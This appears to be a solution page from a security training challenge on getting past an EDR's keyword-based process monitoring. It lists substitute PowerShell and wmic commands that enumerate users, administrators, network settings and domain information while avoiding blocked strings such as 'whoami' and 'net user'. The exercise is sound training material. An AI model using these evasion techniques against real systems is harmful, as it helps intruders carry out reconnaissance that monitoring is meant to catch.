---
title: "Solution 12: Living Off The Land"
difficulty: medium
category: "Process Monitoring Bypass"
---

[Back to Challenge]({{ '/challenges/12-living-off-the-land/' | relative_url }})

## Overview

The EDR's keyword lists are limited. Many alternative commands achieve the same results without triggering detection.

## Solution

```powershell
# Get current username (instead of "whoami")
echo %USERNAME%
[Environment]::UserName
$env:USERNAME
wmic computersystem get username
quser

# Get local users (instead of "net user")
wmic useraccount list brief
Get-WmiObject Win32_UserAccount | Select Name
Get-LocalUser

# Get IP configuration (instead of "ipconfig")
Get-NetIPConfiguration
Get-NetIPAddress
wmic nicconfig get IPAddress

# Get local administrators (instead of "net localgroup administrators")
Get-LocalGroupMember -Group "Administrators"
wmic group where name="Administrators" get /value

# Get domain info (instead of "nltest")
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
wmic computersystem get domain
```

## Why It Works

The EDR only checks for specific command strings. Windows provides dozens of ways to get the same information through different tools and APIs. The LOLBAS (Living Off The Land Binaries and Scripts) project documents hundreds of such alternatives.
